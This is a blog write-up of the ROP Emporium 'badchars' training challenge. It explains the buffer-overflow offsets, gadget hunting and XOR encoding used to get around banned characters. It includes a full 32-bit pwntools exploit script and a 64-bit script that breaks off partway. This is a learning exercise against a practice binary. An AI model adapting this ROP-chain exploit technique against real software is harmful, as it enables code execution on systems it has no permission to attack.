<!DOCTYPE html> <html lang="en"> <head> <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"> <meta charset="utf-8"> <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"> <meta http-equiv="X-UA-Compatible" content="IE=edge"> <title>ROP Emporium - badchars | Parro </title> <meta name="author" content="Parro "> <meta name="description" content="ROP Emporium challenge 5 - badchars"> <meta name="keywords" content="jekyll, jekyll-theme, academic-website, portfolio-website"> <link href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.1/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha256-DF7Zhf293AJxJNTmh5zhoYYIMs2oXitRfBjY+9L//AY=" crossorigin="anonymous"> <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/mdbootstrap@4.20.0/css/mdb.min.css" integrity="sha256-jpjYvU3G3N6nrrBwXJoVEYI/0zw8htfFnhT9ljN3JJw=" crossorigin="anonymous"> <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/all.min.css" integrity="sha256-mUZM63G8m73Mcidfrv5E+Y61y7a12O5mW4ezU3bxqW4=" crossorigin="anonymous"> <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/academicons@1.9.1/css/academicons.min.css" integrity="sha256-i1+4qU2G2860dGGIOJscdC30s9beBXjFfzjWLjBRsBg=" crossorigin="anonymous"> <link rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,700%7CRoboto+Slab:100,300,400,500,700%7CMaterial+Icons"> <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/jwarby/jekyll-pygments-themes@master/github.css" media="" id="highlight_theme_light"> <link rel="shortcut icon" href="data:image/svg+xml,&lt;svg%20xmlns=%22http://www.w3.org/2000/svg%22%20viewBox=%220%200%20100%20100%22&gt;&lt;text%20y=%22.9em%22%20font-size=%2290%22&gt;%E2%9A%A1&lt;/text&gt;&lt;/svg&gt;"> <link rel="stylesheet" href="/assets/css/main.css"> <link rel="canonical" href="https://parroquet.github.io/blog/2023/badchars/"> <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/jwarby/jekyll-pygments-themes@master/native.css" media="none" id="highlight_theme_dark"> <script src="/assets/js/theme.js"></script> <script src="/assets/js/dark_mode.js"></script> </head> <body class="fixed-top-nav "> <header> <nav id="navbar" class="navbar navbar-light navbar-expand-sm fixed-top"> <div class="container"> <a class="navbar-brand title font-weight-lighter" href="/"><span class="font-weight-bold">Parro </span></a> <button class="navbar-toggler collapsed ml-auto" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation"> <span class="sr-only">Toggle navigation</span> <span class="icon-bar top-bar"></span> <span class="icon-bar middle-bar"></span> <span class="icon-bar bottom-bar"></span> </button> <div class="collapse navbar-collapse text-right" id="navbarNav"> <ul class="navbar-nav ml-auto flex-nowrap"> <li class="nav-item "> <a class="nav-link" href="/">About</a> </li> <li class="nav-item active"> <a class="nav-link" href="/blog/">Blog<span class="sr-only">(current)</span></a> </li> <li class="nav-item "> <a class="nav-link" href="/hackthebox/">Hackthebox</a> </li> <li class="nav-item "> <a class="nav-link" href="/repositories/">Repositories</a> </li> <li class="toggle-container"> <button id="light-toggle" title="Change theme"> <i class="fas fa-moon"></i> <i class="fas fa-sun"></i> </button> </li> </ul> </div> </div> </nav> <progress id="progress" value="0"> <div class="progress-container"> <span class="progress-bar"></span> </div> </progress> </header> <div class="container mt-5"> <div class="post"> <header class="post-header"> <h1 class="post-title">ROP Emporium - badchars</h1> <p class="post-meta">January 2, 2023</p> <p class="post-tags"> <a href="/blog/2023"> <i class="fas fa-calendar fa-sm"></i> 2023 </a>   ·   <a href="/blog/tag/formatting"> <i class="fas fa-hashtag fa-sm"></i> formatting</a>   <a href="/blog/tag/links"> <i class="fas fa-hashtag fa-sm"></i> links</a>   <a href="/blog/tag/binexp"> <i class="fas fa-hashtag fa-sm"></i> binexp</a>     ·   <a href="/blog/category/rop"> <i class="fas fa-tag fa-sm"></i> ROP</a>   <a href="/blog/category/gdb"> <i class="fas fa-tag fa-sm"></i> GDB</a>   <a href="/blog/category/pwndbg"> <i class="fas fa-tag fa-sm"></i> pwndbg</a>   <a href="/blog/category/pwntools"> <i class="fas fa-tag fa-sm"></i> pwntools</a>   </p> </header> <article class="post-content"> <h2 id="basic-setup">Basic setup:</h2> <ul> <li>ROPEmporium x86 &amp; x86_64 binaries</li> <li>Ubuntu lab machine</li> <li>GDB &amp; pwndbg</li> <li>pwntools</li> </ul> <p> </p> <h3 id="link-to-challenge">Link to challenge</h3> <p><a href="https://ropemporium.com/challenge/badchars.html" rel="external nofollow noopener" target="_blank">https://ropemporium.com/challenge/badchars.html</a></p> <p> </p> <h3 id="the-32-bit-solve">The 32 bit solve</h3> <p>The aim of this challenge is similar to the challenge before (write4) where we aim to write the string “flag.txt” to an area of free memory so that the imported function <strong>print_file</strong> can be called with this argument which would print the flag. For this we need to utilise multiple ROP gadgets to build a ROP chain which can do this for us. However, some characters (a,g,x and .) have been banned and we need to find a work around. To do this work around, I used a XOR gadget which could bypass these banned characters being written.</p> <p> </p> <p><img src="../../../assets/img/badchars_img/1checksec.png" alt="checksec" width="750"></p> <p>The first step is to run <strong>checksec</strong> in order to find protections. Like usual, NX in enabled and partial RELRO exists so a ROP chain is required.</p> <p> </p> <p><img src="../../../assets/img/badchars_img/2rabin.png" alt="rabin" width="750"></p> <p>Using the <strong>rabin2</strong> command we can see the strings with the -z flag as well as the imported functions with the -i flag. Here we can see the address of the print_file function which we will need to call. However, nothing else of use seeems to be present and we will need to utilise writeable memory locations to store strings. We also used the -S flag here to list the sections so that we can find a writeable area of memory with atleast 8 bytes of space for us to store the “flag.txt” string. The .data section meets this criteria so its address can be noted.</p> <p> </p> <p><img src="../../../assets/img/badchars_img/3usefulgadgets.png" alt="usefulgadgets" width="750"></p> <p>Opening the binary up within pwndbg, we can disassemble the usefulGadgets function in order to find some gadgets which may be worth taking note of. As usual, we see this <strong>mov DWORD PTR [edi],esi ; ret</strong> gadget which will be useful for us when writing values to the writeable memory section. We also see the gadget <strong>xor BYTE PTR [ebp+0x0], bl ; ret</strong> which can be used to XOR a specific byte with the lower quadrant of the ebx register (bottom 8). We can use this for each banned character by converting a valid string to “flag.txt” before we call print_file.</p> <p> </p> <p><img src="../../../assets/img/badchars_img/4usefulfunction.png" alt="usefulfunction" width="750"></p> <p>The function usefulFunction also exists which we can see the address of the <strong>call print_file</strong> instruction. We will be using the address on the far left here as this will mean that we do not need to provide a junk return address when using just <strong>print_file</strong>.</p> <p> </p> <p><img src="../../../assets/img/badchars_img/5xor.png" alt="xor" width="750"></p> <p>Now we have found some useful gadgets and the address for the print_file call, we can develop our logic for the XOR shenanigans. We can use <strong>Cyberchef</strong> to convert the banned characters to new characters using XOR with a key of the letter <strong>K</strong>. This will give us the characters <strong>*,e3</strong> which are valid characters. This makes our string <strong>fl*,et3t</strong> instead of <strong>flag.txt</strong>. We can then use the XOR gadget before calling the print_file instruction to convert the string back to <strong>flag.txt</strong> so that we can bypass inputting the invalid characters.</p> <p> </p> <p><img src="../../../assets/img/badchars_img/6popformoving.png" alt="popformoving" width="750"></p> <p>As we start to order our payload in a separate text file, we now need to find our supplimentary gadgets so that our <strong>xor BYTE PTR [ebp+0x0], bl ; ret</strong> and <strong>mov DWORD PTR [edi],esi ; ret</strong> gadgets can be used with correct values in registers. We can use the <strong>ROPgadget</strong> command to search for these and we can copy the address. Here we see <strong>pop esi ; pop edi ; pop ebp ; ret</strong> which we can use to set both registers within the gadget <strong>mov DWORD PTR [edi],esi ; ret</strong>.</p> <p> </p> <p><img src="../../../assets/img/badchars_img/7popebp.png" alt="popebp" width="750"></p> <p>We now need to find a gadget which will allow us to set the value of ebp for the XOR gadget. This value will hold the address of the .data section for writing to. Through the command used before, we can search for <strong>pop ebp</strong> and we can see that a gadget for <strong>pop ebp ; ret</strong> is available so we can copy the address.</p> <p> </p> <p><img src="../../../assets/img/badchars_img/8popebx.png" alt="popebx" width="750"></p> <p>Lastly, for the XOR gadget, we need to find a gadget which will allow us to set the value of ebx. We can use the <strong>ROPgadget</strong> command again to search for <strong>pop ebx</strong> and we can see that a gadget for <strong>pop ebx ; ret</strong> is available so we can copy the address.</p> <p> </p> <p><img src="../../../assets/img/badchars_img/14cyclic32.png" alt="cyclic32" width="750"></p> <p>The final thing we need to do before writing our payload is to find the offset that the buffer overflow occurs at. As there is banned characters which we cannot input, we will need to use the <strong>cyclic</strong> command as usual but using the -a flag to specify the alphabet to use. We can use bcdefhijk as it is enough characters and excludes all the banned characters. This value can then be inputted into the input field and the value of EIP can be copied.</p> <p> </p> <p><img src="../../../assets/img/badchars_img/15offset32.png" alt="offset32" width="750"></p> <p>Now we can use the -l flag along with the alphabet parameter to find the offset of the buffer overflow. This value is 44.</p> <p> </p> <p><img src="../../../assets/img/badchars_img/9order.png" alt="order" width="750"></p> <p>Now we can order our payload and ROP chain. We first need to write the first 4 bytes of the string which avoids banned characters to the stack along with the .data address. We can use pop on line 1 to then move these into appropriate registers. The ebp register isn’t needed yet so we can fill it with random junk. The mov gadget can then be used to write the value in esi to the address of the .data section.</p> <p>We then need to repeat this process with the second half of the string, writing it after the previously written part by specifying the .data section + 0x4 bytes.</p> <p>A loop of through each banned character then is started which will XOR the correct index in memory with the lower quadrant of ebx. This will convert the stored valid characters to the desired banned characters we need.</p> <p>Finally, we can call the <strong>print_file</strong> function with the address of the .data section as the argument. This will print the flag.txt file to the terminal.</p> <p> </p> <p><img src="../../../assets/img/badchars_img/10flag.png" alt="flag" width="750"></p> <p>A python3 script was created to generate the payload and complete this exploit. It uses pwntools similar to the other challenges and as usual, will be available at the end of this post.</p> <p> </p> <h3 id="the-64-bit-solve">The 64 bit solve</h3> <p>The 64 bit version of this challenge is similar but handles arguments differently. We also do not need to handle the string in blocks of 4 bytes as 64 bit architecture increases this to 8 bytes.</p> <p> </p> <p><img src="../../../assets/img/badchars_img/11rabin.png" alt="rabin" width="750"></p> <p>Using the <strong>rabin2</strong> command we can see the strings with the -z flag as well as the imported functions with the -i flag. Here we can see the address of the print_file function which we will need to call. However, nothing else of use seeems to be present and we will need to utilise writeable memory locations to store strings. We also used the -S flag here to list the sections so that we can find a writeable area of memory with atleast 8 bytes of space for us to store the “flag.txt” string. The .data section meets this criteria so its address can be noted.</p> <p>It is worth noting that we can use the .data section here but we should keep in mind that data may be written during runtime to this section which would mess up our exploit. We can use the .bss section instead which is a section of memory which is not initialised and is writeable. This is a better option as it won’t be written to by anything else during runtime. For our exploit, we will be using the .data section and for it to work, we will need to start the address from .data_address + 0x2.</p> <p> </p> <p><img src="../../../assets/img/badchars_img/12usefulfunction.png" alt="usefulfunction" width="750"></p> <p>Following the same logic as the 32 bit challenge, we can disassemble the usefulFunction provided to copy the address of the <strong>call print_file</strong> instruction.</p> <p> </p> <p><img src="../../../assets/img/badchars_img/13usefulgadgets.png" alt="usefulgadgets" width="750"></p> <p>Looking at the usefulGadgets function, we can see new gadgets of interest. Specifically, we can see <strong>xor BYTE PTR [r15],r14b</strong> which we can use for our bad character bypass. We can also see <strong>mov QWORD PTR [r13+0x0],r12</strong> which we can use to write our string to the .data section.</p> <p> </p> <p><img src="../../../assets/img/badchars_img/16cyclic64.png" alt="cyclic64" width="750"></p> <p>Next we can get the offset for our exploit. Again we can use the <strong>cyclic</strong> command along with the -a flag to generate our input string. We can then input this into the input field and copy the value of RSP. We can then use the -l flag along with the alphabet parameter to find the offset of the buffer overflow.</p> <p> </p> <p><img src="../../../assets/img/badchars_img/17offset64.png" alt="offset64" width="750"></p> <p>This offset value is 40.</p> <p> </p> <p><img src="../../../assets/img/badchars_img/18popall.png" alt="popall" width="750"></p> <p>To accompany our <strong>mov QWORD PTR [r13+0x0],r12</strong> gadget, we need to fill the r13 and r12 registers. We can search using <strong>ROPgadget</strong> for a gadget which will allow us to do this. We can see that a gadget for <strong>pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</strong> is available so we can copy the address. r14 and r15 are not needed yet in our ordering logic so we can fill them with junk.</p> <p> </p> <p><img src="../../../assets/img/badchars_img/19popr14.png" alt="popr14" width="750"></p> <p>In order to accompany our <strong>xor BYTE PTR [r15],r14b</strong> gadget, we need to fill the r14 and r15 registers separately. We can search using <strong>ROPgadget</strong> for a gadget which will allow us to see a gadget for <strong>pop r14 ; pop r15 ; ret</strong> so we can copy the address.</p> <p> </p> <p><img src="../../../assets/img/badchars_img/20poprdi.png" alt="poprdi" width="750"></p> <p>64 bit architecture requires parameters inside the rdi register instead of being on the stack like the 32 bit architecture. We can search using <strong>ROPgadget</strong> for a gadget which will allow us pop rdi. A gadget for <strong>pop rdi ; ret</strong> exists so we can copy the address.</p> <p> </p> <p><img src="../../../assets/img/badchars_img/22order.png" alt="order" width="750"></p> <p>Finally, we can start to develop our exploit by working out the ordering. First, we will need to put our bypassing flag.txt string into the r12 register as well as the address of the .data section into the r13 register using our <strong>pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</strong> gadget. We can then use our <strong>mov QWORD PTR [r13+0x0],r12</strong> gadget to write the string to the .data section.</p> <p>Next, we will start a loop which will perform the converting of the valid characters into the banned characters we need to read the flag. We will need to fill the r14 register with the key for our XOR operating and the r15 register with the address of the .data section indexed at the byte we want to convert.</p> <p>After converting it all, we can populate the rdi register with the address of the .data section and call the <strong>print_file</strong> function which will get its required argument from the rdi register. The flag is then output to the screen.</p> <p> </p> <p><img src="../../../assets/img/badchars_img/21flag.png" alt="flag" width="750"></p> <p>A python3 script was created to generate the payload and complete this exploit. It uses pwntools similar to the other challenges and as usual, will be available at the end of this post.</p> <p> </p> <h2 id="the-32-bit-python-script">The 32 bit python script</h2> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="c1">##### SETUP &amp; RUN #####
</span>
<span class="c1">#Define the executable
</span><span class="n">exe</span> <span class="o">=</span> <span class="s">'./badchars32'</span>

<span class="c1"># This will automatically get context arch, bits, os etc
</span><span class="n">elf</span> <span class="o">=</span> <span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">exe</span><span class="p">,</span> <span class="n">checksec</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>

<span class="c1"># verbose logging so we can see what is being sent
</span><span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">'info'</span>

<span class="c1">#delete corefiles after crash occurs
</span><span class="n">context</span><span class="p">.</span><span class="n">delete_corefiles</span> <span class="o">=</span> <span class="bp">True</span>

<span class="c1"># run the elf
</span><span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">()</span>

<span class="c1">##### FIND USEFUL ADDRESSES #####
</span>
<span class="c1"># Locate the functions/strings we need - either do this manually or using pwntools
</span>
<span class="c1"># Address needed to put parameters in registers
</span><span class="n">datasection</span> <span class="o">=</span> <span class="mh">0x0804a018</span>
<span class="n">mov_gadget</span> <span class="o">=</span> <span class="mh">0x0804854f</span>
<span class="n">pop_gadget</span> <span class="o">=</span> <span class="mh">0x080485b9</span>
<span class="n">flagstr</span> <span class="o">=</span> <span class="mh">0x2c2a6c66</span>
<span class="n">txtstr</span> <span class="o">=</span> <span class="mh">0x74337465</span>    <span class="c1"># writing text to memory requires little endian so it can be converted to big
</span><span class="n">call_print_file</span> <span class="o">=</span> <span class="mh">0x08048538</span>
<span class="n">junkaddr</span> <span class="o">=</span> <span class="mh">0x61616161</span>
<span class="n">xor_gadget</span> <span class="o">=</span> <span class="mh">0x08048547</span>
<span class="n">pop_ebx</span> <span class="o">=</span> <span class="mh">0x0804839d</span>
<span class="n">pop_ebp</span> <span class="o">=</span> <span class="mh">0x080485bb</span>
<span class="n">k</span> <span class="o">=</span> <span class="mh">0x0000004b</span>
<span class="n">badchars</span> <span class="o">=</span> <span class="p">[</span><span class="s">'a'</span><span class="p">,</span><span class="s">'g'</span><span class="p">,</span><span class="s">'.'</span><span class="p">,</span><span class="s">'x'</span><span class="p">]</span>

<span class="c1"># Print out the target address
</span><span class="n">info</span><span class="p">(</span><span class="s">"%#x writable .data section"</span><span class="p">,</span> <span class="n">datasection</span><span class="p">)</span>
<span class="n">info</span><span class="p">(</span><span class="s">"%#x mov DWORD PTR [edi], esi"</span><span class="p">,</span> <span class="n">mov_gadget</span><span class="p">)</span>
<span class="n">info</span><span class="p">(</span><span class="s">"%#x pop esi ; pop edi ; pop ebp ; ret"</span><span class="p">,</span> <span class="n">pop_gadget</span><span class="p">)</span>
<span class="n">info</span><span class="p">(</span><span class="s">"%#x fl*, (flag) string"</span><span class="p">,</span> <span class="n">flagstr</span><span class="p">)</span>
<span class="n">info</span><span class="p">(</span><span class="s">"%#x et3t (.txt) string"</span><span class="p">,</span> <span class="n">txtstr</span><span class="p">)</span>
<span class="n">info</span><span class="p">(</span><span class="s">"%#x pop ebx ; ret"</span><span class="p">,</span> <span class="n">pop_ebx</span><span class="p">)</span>
<span class="n">info</span><span class="p">(</span><span class="s">"%#x pop ebp ; ret"</span><span class="p">,</span> <span class="n">pop_ebp</span><span class="p">)</span>
<span class="n">info</span><span class="p">(</span><span class="s">"%#x Value of K used to xor"</span><span class="p">,</span> <span class="n">k</span><span class="p">)</span>
<span class="n">info</span><span class="p">(</span><span class="s">"%#x xor BYTE PTR [ebp+0x0],bl ; ret"</span><span class="p">,</span> <span class="n">xor_gadget</span><span class="p">)</span>
<span class="n">info</span><span class="p">(</span><span class="s">"%#x call print_file"</span><span class="p">,</span> <span class="n">call_print_file</span><span class="p">)</span>
<span class="n">info</span><span class="p">(</span><span class="s">"%#x random junk address"</span><span class="p">,</span> <span class="n">junkaddr</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="s">"Bad characters:"</span><span class="p">,</span> <span class="n">badchars</span><span class="p">)</span>



<span class="c1">##### FIND CRASH OVERWRITE RETURN ADDRESS OFFSET #####
</span>
<span class="c1"># We will send a 'cyclic' pattern which overwrites the return address on the stack
# needs alphabet parameter so that banned characters aren't used.
</span><span class="n">payload</span> <span class="o">=</span> <span class="n">cyclic</span><span class="p">(</span><span class="mi">200</span><span class="p">,</span><span class="n">alphabet</span><span class="o">=</span><span class="s">'bcdefhijk'</span><span class="p">)</span>

<span class="c1"># Send cyclic pattern to crash it
</span><span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">'&gt; '</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>

<span class="c1"># Wait for the process to crash
</span><span class="n">io</span><span class="p">.</span><span class="n">wait</span><span class="p">()</span>

<span class="c1"># Open up the corefile created after crash
</span><span class="n">core</span> <span class="o">=</span> <span class="n">io</span><span class="p">.</span><span class="n">corefile</span>

<span class="c1"># Print out the address of EIP at the time of crashing
</span><span class="n">eip_value</span> <span class="o">=</span> <span class="n">core</span><span class="p">.</span><span class="n">eip</span>
<span class="c1"># cyclic find needs alphabet parameter so that banned characters aren't used.
</span><span class="n">eip_offset</span> <span class="o">=</span> <span class="n">cyclic_find</span><span class="p">(</span><span class="n">eip_value</span><span class="p">,</span><span class="n">alphabet</span><span class="o">=</span><span class="s">'bcdefhijk'</span><span class="p">)</span>
<span class="n">info</span><span class="p">(</span><span class="s">'located EIP offset at {a}'</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">a</span><span class="o">=</span><span class="n">eip_offset</span><span class="p">))</span>

<span class="c1">##### CRAFTING PAYLOAD #####
</span>
<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">""</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">'A'</span> <span class="o">*</span> <span class="n">eip_offset</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">pop_gadget</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">flagstr</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">datasection</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">junkaddr</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">mov_gadget</span><span class="p">)</span>

<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">pop_gadget</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">txtstr</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">datasection</span> <span class="o">+</span> <span class="mh">0x4</span><span class="p">)</span> <span class="c1"># +4 so that we don't overwrite our "flag" string
</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">junkaddr</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">mov_gadget</span><span class="p">)</span>

<span class="k">for</span> <span class="n">char</span> <span class="ow">in</span> <span class="n">badchars</span><span class="p">:</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">pop_ebx</span><span class="p">)</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">k</span><span class="p">)</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">pop_ebp</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">char</span> <span class="o">==</span> <span class="s">'a'</span><span class="p">:</span>
        <span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">datasection</span> <span class="o">+</span> <span class="mh">0x2</span><span class="p">)</span> <span class="c1"># a value
</span>    <span class="k">elif</span> <span class="n">char</span> <span class="o">==</span> <span class="s">'g'</span><span class="p">:</span>
        <span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">datasection</span> <span class="o">+</span> <span class="mh">0x3</span><span class="p">)</span> <span class="c1"># g value
</span>    <span class="k">elif</span> <span class="n">char</span> <span class="o">==</span> <span class="s">'.'</span><span class="p">:</span>
        <span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">datasection</span> <span class="o">+</span> <span class="mh">0x4</span><span class="p">)</span> <span class="c1"># . value
</span>    <span class="k">elif</span> <span class="n">char</span> <span class="o">==</span> <span class="s">'x'</span><span class="p">:</span>
        <span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">datasection</span> <span class="o">+</span> <span class="mh">0x6</span><span class="p">)</span> <span class="c1"># x value
</span>    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">xor_gadget</span><span class="p">)</span>

<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">call_print_file</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">datasection</span><span class="p">)</span>


<span class="k">print</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>

<span class="c1">##### SEND PAYLOAD AND GET FLAG #####
</span>
<span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">()</span>
<span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">'&gt;'</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
<span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">'Thank you!</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>

<span class="c1">#Get our flag!
</span><span class="n">flag</span> <span class="o">=</span> <span class="n">io</span><span class="p">.</span><span class="n">recv</span><span class="p">()</span>
<span class="n">success</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>

<span class="c1">##### END #####
</span></code></pre></div></div> <p> </p> <h2 id="the-64-bit-python-script">The 64 bit python script</h2> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="c1">##### SETUP &amp; RUN #####
</span>
<span class="c1">#Define the executable
</span><span class="n">exe</span> <span class="o">=</span> <span class="s">'./badchars'</span>

<span class="c1"># This will automatically get context arch, bits, os etc
</span><span class="n">elf</span> <span class="o">=</span> <span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">exe</span><span class="p">,</span> <span class="n">checksec</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
<span class="c1"># verbose logging so we can see what is being sent
</span><span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">'info'</span>

<span class="c1">#delete corefiles after crash occurs
</span><span class="n">context</span><span class="p">.</span><span class="n">delete_corefiles</span> <span class="o">=</span> <span class="bp">True</span>

<span class="c1"># run the elf
</span><span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">()</span>

<span class="c1">##### FIND USEFUL ADDRESSES #####
</span>
<span class="c1"># Locate the functions/strings we need - either do this manually or using pwntools
</span>
<span class="n">call_print_file</span> <span class="o">=</span> <span class="mh">0x0000000000400620</span>
<span class="n">mov_qword_gadget</span> <span class="o">=</span> <span class="mh">0x0000000000400634</span>
<span class="n">pop_rdi_gadget</span> <span class="o">=</span> <span class="mh">0x00000000004006a3</span>
<span class="n">pop_r14_r15_gadget</span> <span class="o">=</span> <span class="mh">0x00000000004006a0</span>
<span class="n">pop_r12_r13_r14_r15</span> <span class="o">=</span> <span class="mh">0x000000000040069c</span>
<span class="n">datasection</span> <span class="o">=</span> <span class="mh">0x0000000000601030</span>
<span class="n">flagtxtstr</span> <span class="o">=</span> <span class="mh">0x743374652c2a6c66</span>
<span class="n">junkaddr</span> <span class="o">=</span> <span class="mh">0x6161616161616161</span>
<span class="n">k</span> <span class="o">=</span> <span class="mh">0x000000000000004b</span>
<span class="n">xor_gadget</span> <span class="o">=</span> <span class="mh">0x0000000000400628</span>

<span class="n">badchars</span> <span class="o">=</span> <span class="p">[</span><span class="s">'a'</span><span class="p">,</span><span class="s">'g'</span><span class="p">,</span><span class="s">'.'</span><span class="p">,</span><span class="s">'x'</span><span class="p">]</span>


<span class="c1"># Print out the target address
</span><span class="n">info</span><span class="p">(</span><span class="s">"%#x writable .data section"</span><span class="p">,</span> <span class="n">datasection</span><span class="p">)</span>
<span class="n">info</span><span class="p">(</span><span class="s">"%#x mov QWORD PTR [r13+0x0], r12"</span><span class="p">,</span> <span class="n">mov_qword_gadget</span><span class="p">)</span>
<span class="n">info</span><span class="p">(</span><span class="s">"%#x pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret"</span><span class="p">,</span> <span class="n">pop_r12_r13_r14_r15</span><span class="p">)</span>
<span class="n">info</span><span class="p">(</span><span class="s">"%#x fl*,et3t (flag.txt) string"</span><span class="p">,</span> <span class="n">flagtxtstr</span><span class="p">)</span>
<span class="n">info</span><span class="p">(</span><span class="s">"%#x pop rdi ; ret"</span><span class="p">,</span> <span class="n">pop_rdi_gadget</span><span class="p">)</span>
<span class="n">info</span><span class="p">(</span><span class="s">"%#x pop r14 ; pop r15 ; ret"</span><span class="p">,</span> <span class="n">pop_r14_r15_gadget</span><span class="p">)</span>
<span class="n">info</span><span class="p">(</span><span class="s">"%#x Value of K used to xor"</span><span class="p">,</span> <span class="n">k</span><span class="p">)</span>
<span class="n">info</span><span class="p">(</span><span class="s">"%#x xor BYTE PTR [r14],r14b ; ret"</span><span class="p">,</span> <span class="n">xor_gadget</span><span class="p">)</span>
<span class="n">info</span><span class="p">(</span><span class="s">"%#x call print_file"</span><span class="p">,</span> <span class="n">call_print_file</span><span class="p">)</span>
<span class="n">info</span><span class="p">(</span><span class="s">"%#x random junk address"</span><span class="p">,</span> <span class="n">junkaddr</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="s">"Bad characters:"</span><span class="p">,</span> <span class="n">badchars</span><span class="p">)</span>


<span class="c1">##### FIND CRASH OVERWRITE RETURN ADDRESS OFFSET #####
</span>
<span class="c1"># We will send a 'cyclic' pattern which overwrites the return address on the stack
# needs alphabet parameter so that banned characters aren't used.
</span><span class="n">payload</span> <span class="o">=</span> <span class="n">cyclic</span><span class="p">(</span><span class="mi">200</span><span class="p">,</span><span class="n">alphabet</span><span class="o">=</span><span class="s">'bcdefhijk'</span><span class="p">)</span>

<span class="c1"># Send cyclic pattern to crash it
</span><span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">'&gt; '</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>

<span class="c1"># Wait for the process to crash
</span><span class="n">io</span><span class="p">.</span><span class="n">wait</span><span class="p">()</span>

<span class="c1"># Open up the corefile created after crash
</span><span class="n">core</span> <span class="o">=</span> <span class="n">io</span><span class="p">.</span><span class="n">corefile</span>

<span class="n">stack</span> <span class="o">=</span> <span class="n">core</span><span class="p">.</span><span class="n">rsp</span>
<span class="n">info</span><span class="p">(</span><span class="s">"%#x stack"</span><span class="p">,</span> <span class="n">stack</span><span class="p">)</span>

<span class="c1"># Read four bytes from RSP, which will be some of our cyclic data.
# With this snippet of the pattern, we know the exact offset from
# the beginning of our controlled data to the return address.
